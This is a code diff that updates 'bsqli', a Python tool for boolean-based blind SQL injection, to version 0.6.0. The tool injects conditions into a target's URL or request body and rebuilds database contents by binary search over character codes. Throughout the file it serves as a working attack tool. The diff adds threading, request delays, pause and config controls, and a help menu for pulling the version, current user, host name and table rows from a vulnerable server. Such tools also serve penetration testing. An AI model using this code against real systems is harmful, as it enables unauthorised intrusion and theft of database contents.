@@ -15,23 +15,30 @@ from enum import Enum
 from dataclasses import dataclass, field
 import copy
 import random
+import threading
+from threading import Event
+import signal
 
 try:
     import urllib3
     import httpx
     from rich.progress import *
+    from rich.logging import RichHandler
     from prompt_toolkit import prompt, PromptSession
     from prompt_toolkit.history import FileHistory
 except ImportError as e:
     print(e)
     print('Make sure you have the necessary packages:')
+    print()
     print('\tpip install urllib3 httpx rich prompt_toolkit')
     sys.exit(1)
 
 
-VERSION = '0.5.5'
+VERSION = '0.6.0'
 
-logging.basicConfig(format='[%(levelname)s] %(message)s')
+logging.basicConfig(format="%(message)s", handlers=[RichHandler(log_time_format="[%X]")])
+logger = logging.getLogger("bsqli")
+
 urllib3.disable_warnings()
 console = Console()
 
@@ -47,18 +54,15 @@ USER_AGENTS = [
 
 DEFAULT_HEADERS = {
     'User-Agent': random.choice(USER_AGENTS),
-    'Cache-Control': 'no-cache',
+    # 'Cache-Control': 'no-cache',
 }
 
 class prompts:
     main = PromptSession(history=FileHistory(".main.prompt.history"))
     table = PromptSession(history=FileHistory(".table.prompt.history"))
     column = PromptSession(history=FileHistory(".column.prompt.history"))
+    cfg = PromptSession()
 
-
-class FormatMinimal(dict):
-    def __missing__(self, key): 
-        return key.join("{}")
 
 class Palette:
     primary: str = 'blue'
@@ -69,10 +73,12 @@ class Palette:
 class SQLPayload:
     vector: str # Unfinished full SQL payload possibly containing parameters.
 
-    @abstractmethod
-    def construct(self, params: dict) -> str:
+    def construct(self, **params) -> str:
         """Returns the complete SQL payload."""
-        return self.vector.format_map(FormatMinimal(params))
+        s = self.vector
+        for k in params:
+            s = s.replace('{' + k + '}', params[k])
+        return s
 
 
 class ResultError(RuntimeError): pass
@@ -128,6 +134,9 @@ def make_session(max_retries: int, proxy: Optional[str]) -> httpx.Client:
     return s
 
 
+class ThreadInterruptException(Exception): pass
+
+
 PAYLOAD_TOKEN = '{payload}'
 COND_TOKEN = '{cond}'
 
@@ -150,46 +159,60 @@ class Sender:
 
     result_parser: ResultParser
 
-    def send(self, **payload_params) -> Any:
+    def send(self, delay: float, delayf: Callable[[float], None], cond: str) -> Any:
         # sender.send(cond='1=1')
-        url, data = self.make_payload(payload_params)
+        url, data = self.make_payload(cond=cond)
 
-        logging.debug(f'requesting...')
-        # logging.debug(f' | payload   : {quoted_payload}')
-        logging.debug(f' | url       : {self.url}')
-        logging.debug(f' | data      : {self.data}')
-        
         for attempt in range(self.retries_on_error + 1):
+            delayf(delay)
+            if attempt == 0:
+                logger.debug(f'requesting...')
+                # logger.debug(f' | payload   : {quoted_payload}')
+                logger.debug(f' | url  : {self.url}')
+                logger.debug(f' | data : {self.data}')
+                if logger.getEffectiveLevel() < logging.INFO:
+                    logger.debug(f' | cond : {cond}')
+                else:
+                    logger.info(f"cond: {cond}")
+
+            logger.debug(f'attempt #{attempt+1}')
+
             try:
                 resp = self.make_request(url, data)
-                # print('status code:', resp.status_code, f'   text: {len(resp.text)}c')
             except ConnectionError as e:
                 raise e
             
             result = self.result_parser.parse(resp)
             if isinstance(result, ResultError):
-                logging.info(f'error encountered: {result.reason}')
-                logging.info(f'retrying... ({attempt+1} / {self.retries_on_error+1})')
+                if attempt == self.retries_on_error:
+                    # This is the LAST. STRAW.
+                    raise result
+                logger.info(f'Got error: {result}')
+                logger.info(f'Retrying... ({attempt+1} / {self.retries_on_error+1})')
             else:
                 return result
 
-    def make_payload(self, payload_params: dict):
+    def make_payload(self, cond: str):
         url, data = self.url, self.data
         
         if PAYLOAD_TOKEN in url:
-            raw_payload = self.payload.construct(payload_params)
+            raw_payload = self.payload.construct(cond=cond)
             quoted_payload = quote_plus(raw_payload)
-            url = url.format_map(FormatMinimal(payload=quoted_payload))
+            url = url.replace(PAYLOAD_TOKEN, quoted_payload)
         elif data and PAYLOAD_TOKEN in data:
-            raw_payload = self.payload.construct(payload_params)
-            quoted_payload = quote(raw_payload)
-            data = data.format_map(FormatMinimal(payload=quoted_payload))
+            raw_payload = self.payload.construct(cond=cond)
+            if data.strip().startswith('{'):
+                # Probably JSON? No need to quote.
+                quoted_payload = raw_payload
+            else:
+                quoted_payload = quote(raw_payload)
+            data = data.replace(PAYLOAD_TOKEN, quoted_payload)
         elif COND_TOKEN in url:
             # PAYLOAD_TOKEN is not found. Substitute COND_TOKEN directly.
-            url = url.format_map(FormatMinimal(**payload_params))
+            url = url.replace(COND_TOKEN, cond)
         elif data and COND_TOKEN in data:
             # PAYLOAD_TOKEN is not found. Substitute COND_TOKEN directly.
-            data = data.format_map(FormatMinimal(**payload_params))
+            data = data.replace(COND_TOKEN, cond)
         else:
             raise RuntimeError('payload token not found')
         
@@ -259,6 +282,55 @@ class BSearchError(Enum):
     ErrorMidway = 3
 
 
+def mk_thread_delay(int_evt: Event, resume_evt: Event, quit_evt: Event, main_thread_int_cb: Callable[[], bool] = lambda: True):
+    """
+    Constructs a delay function which waits for an interrupting Thread.Event, rather than using time.sleep.
+    Main thread callback should return True if execution continues, or False if interrupted.
+    """
+    def handle_int_signal(signo, _frame):
+        resume_evt.clear()
+        int_evt.set()
+
+    signal.signal(signal.SIGTERM, handle_int_signal) # Unix-like
+    signal.signal(signal.SIGINT, handle_int_signal)  # Windows
+    signal.signal(signal.SIGABRT, lambda signo, _frame: print('SIGABRT called')) 
+    try: signal.signal(signal.SIGQUIT, lambda signo, _frame: print('SIGQUIT called')) 
+    except AttributeError: pass
+    # try: signal.signal(signal.SIGKILL, lambda signo, _frame: print('SIGKILL called')) 
+    # except AttributeError: pass
+    try: signal.signal(signal.SIGBREAK, lambda signo, _frame: print('SIGBREAK called')) 
+    except AttributeError: pass
+    
+    def delay(sec):
+        if threading.current_thread() is threading.main_thread():
+            start = time.time()
+            while not int_evt.wait(0.1) and (time.time() - start) < sec:
+                pass
+
+            if int_evt.is_set():
+                logger.debug('[main] Interrupt detected.')
+                if not main_thread_int_cb():
+                    raise ThreadInterruptException
+        else:
+            # Not main thread.
+            if quit_evt.is_set():
+                # Smokers should be like these threads... just quit early.
+                raise ThreadInterruptException
+            
+            if int_evt.wait(sec):
+                # Interrupt detected. Wait for synchronous resume.
+                logger.debug('[thread] Interrupt detected, waiting for resume.')
+
+                resume_evt.wait()
+                if quit_evt.is_set():
+                    # Move to the top level by throwing an exception.
+                    raise ThreadInterruptException
+                else:
+                    # Resume running.
+                    pass
+    
+    return delay
+            
 
 @dataclass
 class SQLStringBrute:
@@ -266,20 +338,63 @@ class SQLStringBrute:
     prog: Progress
     dbms: DBMS
     max_threads: int
+    delay: float
 
-    def get_by_bsearch(self, sql: str, min: int, max: int, *, index: Optional[int]=None, task=None):
+    int_evt: Event = Event()
+    resume_evt: Event = Event()
+    quit_evt: Event = Event()
+    delayf: Callable[[float], None] = time.sleep
+
+    def mk_delayf(self):
+        self.delayf = mk_thread_delay(self.int_evt, self.resume_evt, self.quit_evt, self.on_main_thread_int)
+    
+    def reset_evts(self):
+        self.int_evt.clear()
+        self.resume_evt.clear()
+        self.quit_evt.clear()
+
+    def on_main_thread_int(self) -> bool:
+        is_interactive = [False] # Use a list[bool] instead of simple bool to hack around Python's variable lookup.
+
+        def disable_prog(prog):
+            prog.update(prog.task_ids[0], visible=False, refresh=True)
+            prog.disable = True
+            prog.live.auto_refresh = False
+            is_interactive[0] = prog.live.console.is_interactive
+            prog.live.console.is_interactive = False
+        
+        def enable_prog(prog):
+            prog.live.console.is_interactive = is_interactive[0]
+            prog.live.auto_refresh = True
+            prog.disable = False
+            prog.update(prog.task_ids[0], visible=True, refresh=True)
+
+        self.int_evt.clear()
+        disable_prog(self.prog)
+        cont = config_loop(self.sender, self, paused_from_task=True)
+        if cont:
+            self.quit_evt.clear()
+        else:
+            self.quit_evt.set()
+        self.resume_evt.set()
+        enable_prog(self.prog)
+        return bool(cont)
+
+    def get_by_bsearch(self, sql: str, min: int, max: int, *, index: Optional[int]=None, task=None, delay: Optional[float] = None) -> int | BSearchError:
         """
         Search for the value of a query within a numeric range: [min, max).
         The query should return one integer.
         For strings, use ASCII(SUBSTRING(s, offset, 1)).
         """
         # prev = None  # Previous guess.
+        if delay == None:
+            delay = self.delay
 
-        if not self.sender.send(cond=f'{sql}<{max}'):
+        if not self.sender.send(cond=f'{sql}<{max}', delay=delay, delayf=self.delayf):
             # Not even within range?
             return BSearchError.AboveMax
         
-        if self.sender.send(cond=f'{sql}<{min}'):
+        if self.sender.send(cond=f'{sql}<{min}', delay=delay, delayf=self.delayf):
             return BSearchError.BelowMin
 
         while min < max:
@@ -292,12 +407,11 @@ class SQLStringBrute:
                 self.prog.update(task, value=mid, advance=1)
             
             if index is None:
-                logging.debug(f'length: {mid}')
+                logger.debug(f'length: {mid}')
             else:
-                logging.debug(f'{index}: {mid}')
+                logger.debug(f'{index}: {mid}')
 
-
-            if self.sender.send(cond=f'{sql}<{mid}'):
+            if self.sender.send(cond=f'{sql}<{mid}', delay=delay, delayf=self.delayf):
                 # Len is upper bound.
                 max = mid
             else:
@@ -322,34 +436,43 @@ class SQLStringBrute:
             return bs.decode()
         except:
             return bs
-
+        
 
     def get_string(self, sql):
+        # TODO: refactor individual tasks into BinarySearch tasks, track progress one level deeper
+        # into the binary search level by estimating the number of requests required and advancing
+        # as appropriate. Put get_length into a BinarySearch task as well, then we can interrupt its
+        # sleep as if from a worker thread rather than main thread.
+        self.reset_evts()
+
+        # Since obtaining length is a single-threaded task, we can compensate for long delays by emulating multiple threads.
+        # In the end, the request rate is the same.
+        single_threaded_delay = self.delay / self.max_threads
         with self.prog:
             max_len = 2048
             task = self.prog.add_task("[green]measuring...", value=str(max_len), total=int(math.log(max_len, 2)+1))
             try:
-                length = self.get_length(sql, max_len=max_len, task=task)
-            except KeyboardInterrupt as e:
+                length = self.get_length(sql, max_len=max_len, task=task, delay=single_threaded_delay)
+            except (ThreadInterruptException, KeyboardInterrupt) as e:
                 self.prog.remove_task(task)
                 raise e # Re-raise to exit to main loop.
-               
+            
             self.prog.remove_task(task)
 
         if isinstance(length, BSearchError):
             if length != BSearchError.AboveMax:
-                logging.warning(f"unable to get length ({length})")
+                logger.warning(f"unable to get length ({length})")
                 return ''
             
-            logging.warning("unable to get length: retrying with higher upper bound")
+            logger.warning("unable to get length: retrying with higher upper bound")
 
             with self.prog:
                 min_len = max_len
                 max_len = 64000
                 task = self.prog.add_task("[green]measuring...", value=str(max_len), total=int(math.log(max_len, 2)+1))
                 try:
-                    length = self.get_length(sql, min_len=min_len, max_len=max_len, task=task)
-                except KeyboardInterrupt as e:
+                    length = self.get_length(sql, min_len=min_len, max_len=max_len, task=task, delay=single_threaded_delay)
+                except (ThreadInterruptException, KeyboardInterrupt) as e:
                     self.prog.remove_task(task)
                     raise e # Re-raise to exit to main loop.
                 
@@ -357,22 +480,16 @@ class SQLStringBrute:
             
             if isinstance(length, BSearchError):
                 # Still???
-                logging.warning(f"unable to get length after compensating ({length})")
+                logger.warning(f"unable to get length after compensating ({length})")
                 return ''
 
-        logging.info(f"Length: {length}")
+        logger.info(f"Length: {length}")
         if length > 5000:
-            logging.warning(f"The deduced length is {length}... that's a lot of chars to get in one go.")
-            logging.warning(f"You may want to hit ^C early to think twice and refine the query.")
+            logger.warning(f"The deduced length is {length}... that's a lot of chars to get in one go.")
+            logger.warning(f"You may want to hit ^C early to think twice and refine the query.")
 
         result_chars = [b'?'] * length
 
-
-        def on_index_finished(task, idx):
-            # self.prog.update doesn't check if the task is in available tasks.
-            # This may be an issue if we interrupted multithreading and some were just finishing.
-            if task in self.prog.task_ids:
-                self.prog.update(task, value=SQLStringBrute.preview_bytes(result_chars), advance=1, refresh=True)
 
         variant = variant_class[self.dbms]
         ASCII = getattr(variant, 'ascii')
@@ -381,6 +498,30 @@ class SQLStringBrute:
         with self.prog:
             init_value = SQLStringBrute.preview_bytes(result_chars)
             task = self.prog.add_task("[green]inspecting...", value=init_value, total=length)
+
+            def on_index_finished(idx):
+                def callback(future):
+                    try:
+                        ch = future.result()
+                        if not isinstance(ch, BSearchError):
+                            # Update char to list.
+                            result_chars[idx] = bytes([ch])
+                    except ThreadInterruptException:
+                        logger.debug(f'ThreadInterruptExecution for Char #{idx}')
+                    except Exception as exc:
+                        logger.warning(f'Char #{idx} generated an exception: {type(exc)} {exc}')
+                    else:
+                        # self.prog.update doesn't check if the task is in available tasks.
+                        # This may be an issue if we interrupted multithreading and some were just finishing.
+                        if task in self.prog.task_ids:
+                            self.prog.update(task, value=SQLStringBrute.preview_bytes(result_chars), advance=1, refresh=True)
+                        if logger.getEffectiveLevel() <= logging.INFO:
+                            if isinstance(ch, ResultError):
+                                self.prog.console.log(f"str[{idx}] = error ({ch})")
+                            else:
+                                self.prog.console.log(f"str[{idx}] = {result_chars[idx]} ({ch})")
+                
+                return callback
 
             try:
                 # Start threads.
@@ -395,27 +536,28 @@ class SQLStringBrute:
                                 min=0,
                                 max=128,
                                 index=idx,
+                                delay=self.delay,
                             )
-                        f.add_done_callback(lambda f: on_index_finished(task, idx))
+                        f.add_done_callback(on_index_finished(idx))
                         future_map[f] = idx
+                    
+                    while True:
+                        sets = concurrent.futures.wait(future_map, timeout=0.1)
+                        if len(sets.not_done) == 0:
+                            # All done!
+                            logger.info('[main] All tasks done!')
+                            break
 
-                    for future in concurrent.futures.as_completed(future_map):
-                        idx = future_map[future]
-                        try:
-                            ch = future.result()
-                            if ch is not None:
-                                result_chars[idx] = bytes([ch])
-                        except Exception as exc:
-                            logging.warning(f'{idx} generated an exception: {type(exc)} {exc}')
-                        else:
-                            if logging.getLogger().getEffectiveLevel() <= logging.INFO:
-                                if isinstance(ch, ResultError):
-                                    self.prog.console.log(f"str[{idx}] = error ({ch})")
-                                else:
-                                    self.prog.console.log(f"str[{idx}] = {result_chars[idx]} ({ch})")
-
-            except KeyboardInterrupt:
-                print('Received KeyboardInterrupt while multi-threading.')
+                        if self.int_evt.is_set():
+                            logger.debug('[main] Interrupt detected.')
+                            res = self.on_main_thread_int()
+                            if not res:
+                                # Quit.
+                                logger.info(f'[main] Quitting early. {len(sets.not_done)} tasks skipped...')
+                                break
+                        
+            except (KeyboardInterrupt, EOFError, ThreadInterruptException) as e:
+                print(f'Received {e.__class__.__name__} while multi-threading.')
                 print('Cleaning up...')
             
             self.prog.remove_task(task)
@@ -435,7 +577,7 @@ class SQLStringBrute:
             self.prog.remove_task(task)
 
         if isinstance(num, BSearchError):
-            logging.warning(f"bsearch error occurred while getting number: {num}")
+            logger.warning(f"bsearch error occurred while getting number: {num}")
             return ''
         
         return str(num)
@@ -458,7 +600,7 @@ class Query:
         start = time.time()
 
         if 'count' in sql[:40].lower():
-            print('Detected `count` query. Switching to (faster) numeric brute.')
+            logger.warning('Detected `count` query. Switching to (faster) numeric brute.')
             res = self.brute.get_number(f'({sql})')
         else:
             if self.options.cast_to_string:
@@ -471,7 +613,7 @@ class Query:
                     case DBMS.OracleSQL:
                         res = self.brute.get_string(f'cast(({sql}) as varchar({cast_len}))')
                     case _:
-                        print('Warning: cast-to-string has not been implemented for the specified DBMS. Defaulting to normal brute.')
+                        logger.warning('Warning: cast-to-string has not been implemented for the specified DBMS. Defaulting to normal brute.')
                         res = self.brute.get_string(f'{sql}')
             else:
                 res = self.brute.get_string(f'{sql}')
@@ -520,7 +662,7 @@ class Query:
                 array = ",".join(f"'{x}'" for x in entries)
                 params.update(where_clause=f' where {col} not in ({array})')
 
-            name = self.brute.get_string(sql.format_map(FormatMinimal(params)))
+            name = self.brute.get_string(sql.format_map(params))
             # else:
             #     name = self.brute.get_string(f'select {col} from {table} where {id_col}={i+1}', max_threads)
             if not name.strip():
@@ -537,11 +679,11 @@ class Query:
 
         ans = prompt(f'Print all ({len(entries)}) entries? [Y/n]')
         if not ans.strip() or ans.lower().startswith('y'):
-            print(table)
-            print('-'*20)
-            print('\n'.join(entries))
+            console.print(table)
+            console.print('-'*20)
+            console.print('\n'.join(entries))
         else:
-            print('\n'.join(entries[:5]))
+            console.print('\n'.join(entries[:5]))
 
 
 def make_headers(args):
@@ -593,6 +735,7 @@ def main():
     parser.add_argument('--strategy', choices=["B"], default='B',
                         help='The strategy to use: Boolean. You don\'t have any other choice at this moment.')
     parser.add_argument('-t', '--threads', default=8, type=int, help='Number of threads to use.')
+    parser.add_argument('-d', '--delay', default=0, type=float, help='Number of seconds to delay each thread between requests.')
     parser.add_argument('-v', action='count', default=0, help='Verbosity. -v for INFO, -vv for DEBUG messages.')
 
     parser.add_argument('-bts', '--boolean-true-if-status', type=int,
@@ -638,11 +781,11 @@ def main():
     
     match args.v:
         case 0:
-            logging.getLogger().setLevel(logging.WARNING)
+            logger.setLevel(logging.WARNING)
         case 1:
-            logging.getLogger().setLevel(logging.INFO)
+            logger.setLevel(logging.INFO)
         case _:
-            logging.getLogger().setLevel(logging.DEBUG)
+            logger.setLevel(logging.DEBUG)
             
     # PAYLOAD_TOKEN = args.payload_token
     # COND_TOKEN = args.cond_token
@@ -689,11 +832,13 @@ def main():
         prog=Progress(
             TextColumn(f"[bold {Palette.primary}]{{task.fields[value]}}"),
             *Progress.get_default_columns(),
-            transient=True
+            transient=True,
         ),
         dbms=args.dbms,
         max_threads=args.threads,
+        delay=args.delay,
     )
+    brute.mk_delayf()
     
     sql_options = SQLOptions(
         cast_to_string=args.cast_to_string,
@@ -708,37 +853,118 @@ def main():
         except KeyboardInterrupt:
             continue
         except EOFError:
-            print('Exiting...')
+            console.print('Exiting...')
             break
         
         try:
-            match sql:
-                case "q":
-                    print("Use 'quit' if you're sure you want to quit.")
-                case "quit":
+            match sql.split():
+                case ["q"] | ["quit"]:
                     break
-                case "help":
-                    print("Help menu hasn't been implemented yet.")
-                case "v":
+                case ["h"] | ["help"]:
+                    console.print("Commands:")
+                    console.print(" [bold green]h/help        [/]- this menu")
+                    console.print(" [bold green]q/quit/Ctrl+D [/]- exit program")
+                    console.print(" [bold green]c/config        [/]- configure settings dynamically")
+                    console.print("")
+                    console.print("To pause the program during a run, hit [green]Ctrl+C[/]. This enters config mode.")
+                    console.print("Then enter 'c'/'continue' to resume execution, or 'q'/'quit' to cancel.")
+                    console.print("")
+                    console.print("Common SQL Commands:")
+                    console.print(" [bold green]v [/]- version")
+                    console.print(" [bold green]u [/]- current user")
+                    console.print(" [bold green]d [/]- database name")
+                    console.print(" [bold green]h [/]- host name")
+                    console.print(" [bold green]s [/]- server name")
+                    console.print(" [bold green]t [/]- enumerate a table and column one row at a time (slow)")
+                    console.print("")
+                    console.print("You can also run any subquery-able SQL command by inputting raw SQL directly, e.g.")
+                    console.print("sqli> SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES", highlight=False)
+                    console.print("")
+                    console.print("Note that the query should return 1 row and 1 column.")
+                    console.print("SQL concat/aggregation functions will help you out here.")
+                    console.print("e.g. JSON_ARRAYAGG / GROUP_CONCAT in MySQL")
+                    console.print("     LISTAGG                      in OracleSQL")
+                    console.print("     CONCAT / CONCAT_WS           for multiple columns")
+                    console.print("")
+                case ["v"]:
                     query.special('version')
-                case "u":
+                case ["u"]:
                     query.special('current_user')
-                case "d":
+                case ["d"]:
                     query.special('database_name')
-                case "h":
+                case ["h"]:
                     query.special('host_name')
-                case "s":
+                case ["s"]:
                     query.special('server_name')
-                case "t":
+                case ["t"]:
                     table = prompts.table.prompt('table> ')
                     col = prompts.column.prompt('col> ')
                     query.query_table(table, col)
-                case "":
+                case ["c"] | ["conf"] | ["config"]:
+                    config_loop(sender, brute)
+                case []:
                     continue
+                case ["set", *_]:
+                    console.print("Use 'config' to enter config mode first.")
                 case _:
                     query.query(sql)
-        except KeyboardInterrupt:
-            print("Received KeyboardInterrupt during enumeration.")
+        except NotImplementedError:
+            console.print(f"Received NotImplementedError during task: {e}.")
+        except (KeyboardInterrupt, EOFError, ThreadInterruptException) as e:
+            console.print(f"Received {e.__class__.__name__} during task.")
+
+
+def config_loop(sender: Sender, brute: SQLStringBrute, paused_from_task=False) -> bool | None:
+    def help():
+        console.print('Usage:')
+        console.print('  [green]set[/] \\[thread|delay|timeout] <value>')
+        if paused_from_task:
+            console.print('  [green]continue / c[/]')
+        console.print('  [green]quit / q[/]')
+    
+    def confirm(op):
+        ans = prompt(f"Are you sure you want to {op}? [y/N] ")
+        return ans.lower().startswith('y')
+
+    while 1:
+        try:
+            line = prompts.cfg.prompt("cfg> ")
+            # line = input("cfg> ")
+            match line.split():
+                case ['set', 'thread', value]:
+                    if paused_from_task:
+                        print("You can't change the number of threads while a task is running.")
+                    brute.max_threads = max(int(value), 1)
+                case ['set', 'delay', value]:
+                    brute.delay = max(float(value), 0.0)
+                case ['set', 'timeout', value]:
+                    sender.timeout = float(value)
+                case ['q', *_] | ['quit', *_]:
+                    if paused_from_task:
+                        if confirm("cancel this operation"):
+                            return False
+                        continue
+                    return
+                case '' | ['c', *_] | ['continue', *_]:
+                    if paused_from_task:
+                        return True
+                    help()
+                case _:
+                    help()
+        except ValueError as e:
+            logger.error(f'ValueError: {e}')
+            help()
+        except (KeyboardInterrupt, EOFError):
+            if paused_from_task:
+                try:
+                    if confirm("cancel this operation"):
+                        return False
+                except (KeyboardInterrupt, EOFError) as e:
+                    logger.debug(f"Got {type(e)}: {e}. I'll take that as a yes.")
+                    return False
+            else:
+                return
+            
 
 try:
     rc = main()
